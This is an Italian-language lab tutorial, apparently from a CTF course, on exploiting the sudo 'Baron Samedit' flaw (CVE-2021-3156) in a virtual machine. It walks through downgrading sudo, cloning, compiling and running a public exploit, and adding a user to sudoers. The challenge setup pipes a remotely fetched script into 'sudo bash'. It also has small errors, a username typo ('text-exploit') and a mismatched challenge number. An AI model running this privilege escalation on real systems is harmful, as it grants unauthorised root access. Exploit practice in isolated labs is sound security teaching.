[cve-2021-3156]: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3156
[qualys]: https://en.wikipedia.org/wiki/Qualys
[qualys-blog-post]: https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit?_ga=2.226100442.1385623629.1616771039-1815361758.1616771039
[challenge-4-setup]: ./assets/challenge-4-setup.sh

# Challenge 4 - Privilage escalation

Benvenuto nella quinta challenge, difficoltà 🤕🤕🤕🤕.
In questa challenge prenderai i panni di un _hacker_.

**Questa challenge e' a solo scopo educativo, pertanto l'autore della challenge non si assume nessuna responsabilità per l'uso che i partecipanti faranno di questa conoscenza.**

## In Questa Challenge

- Utilizzo di funzioni avanzate della shell.
- Compilare un programma da riga di comando.
- Exploitare la vulnerabilità di sudo.
- Effettuare una privilage escalation.
- Proteggersi dall'attacco.

## Introduzione

La vulnerabilità nota con il nome di _Baron Samedit_ documentata in [CVE-2021-3156][cve-2021-3156], e' una delle scoperte più scioccanti dell'ultimo decennio. _Sudo_ e' un programma preinstallato nella maggior parte dei sistemi operativi GNU/Linux, e' utilizzato per eseguire programmi da riga di comando con _permessi di root_ non essendo root. Purtroppo i programmi non sono perfetti e possono essere exploitati attraverso delle vulnerabilità. Queste vulnerabilità possono essere più o meno note al pubblico. Quando una vulnerabilità viene pubblicata gli sviluppatori si mobilitano per correggere il problema rilasciando una nuova versione.
La vulnerabilità _Baron Sameid_ e' stata presente per più di **10 anni** introdotta con un aggiornamento in _luglio 2011_, secondo il team di ricercatori della [Qualys][qualys] coloro che hanno trovato la vulnerabilità.

Exploitando la vulnerabilità permette di ottenere i _permessi di root_ completi anche non facendo parte del _gruppo sudo_. Questo avviene per un bug con il comando `sudoedit -s`. Per maggiori informazioni riguardo alla vulnerabilità visita il [blog post][qualys-blog-post] sul sito di Qualys.

## Proof Of Concept

Per testare questo exploit assicurati di essere in un ambiente sicuro. Guarda la [Challenge 1][challenge-1] per sapere come installare velocemente una macchina virtuale.

Prima di tutto bisogna installare una versione di _sudo_ che contenga il bug.
Fai il downgrade di _sudo_

``` shell
sudo apt install sudo=1.8.31-1ubuntu1
```

E' possibile che la macchina non abbia i programmi necessari per compilare il codice. Installali

``` shell
sudo apt install build-essential
```

Avendo già i _permessi di root_ come utente attuale non ha senso eseguire l'exploit ora. Crea un nuovo utente

``` shell
sudo adduser test-exploit
```

> Inserisci una password e premi `invio` al resto dei i prompt.

Accedi come l'utente `test-exploit`

``` shell
su test-exploit
```

Verifica che il nuovo utente non sia uno _sudoer_

``` shell
sudo -v
```

> L'output dovrebbe essere: _Sorry, user test-exploit may not run sudo on ubuntu-204_.

Verifica che non abbia privilegi di root

``` shell
touch /etc/test
```

> L'output dovrebbe essere: _touch: cannot touch '/etc/test': Permission denied_.

Su GitHub esistono diverse implementazioni dell'exploit. Guardare il codice sorgente di queste implementazioni e' un ottimo modo per imparare.
Scarica l'exploit

``` shell
git clone https://github.com/blasty/CVE-2021-3156 
```

Compila il programma

``` shell
cd CVE-2021-3156/
make
```

Esegui l'exploit

``` shell
./sudo-hax-me-a-sandwich 1
```

Verifica che tua abbia i _permessi di root_ creando un file in `/etc`

``` shell
touch /etc/test
ls -l /etc/t*
```

Aggiungi l'utente `test-exploit` tra i _sudoers_

``` shell
adduser text-exploit sudo
```

Da ora in poi l'utente `text-exploit` fa parte del gruppo `sudo` quindi potrà eseguire comandi con _permessi di root_.

Per provare che le modifiche siano avvenute veramente e che non e' stato un trucco, riavvia la macchina, accedi come utente `text-exploit` ed inizia ad usare i nuovi super poteri.

## Riassunto

- Cos'è la vulnerabilità _Baron Samedit_.
- Come fare il downgrade di un pacchetto.
-  Come creare un nuovo utente.
- Come compilare un programma.
- Come ottenere i _permessi di root_ attraverso un exploit.
-  Come aggiungere un'utente al gruppo _sudo_.

## Challenge

Dato l'accesso ad una macchina come utente `challenge-4` con  solo due permessi, l'esecuzione del comando `exit` e dell'editor `vi`. Attraverso una _privilage escalation_ crea il file `/etc/hacked.txt` con all'interno il testo `Sei stato hackerato`.

Prima di iniziare la challenge prepara la macchina. Crea un nuovo utente  `challenge-4` ed esegui [questo script][challenge-4-setup] con _permessi di root_. Lo script configura adeguatamente l'utente `challenge-4` per la challenge e prende in input due argomenti,l'utente e l'hostname.

``` shell
sudo adduser challenge-4
curl https://gitlab.com/pdpfsug/mkspace/challenges/-/raw/master/challenge-4/assets/challenge-4-setup.sh | sudo bash -s challenge-4 challenge-ubuntu
su -l challenge-4
```

> Buona fortuna.
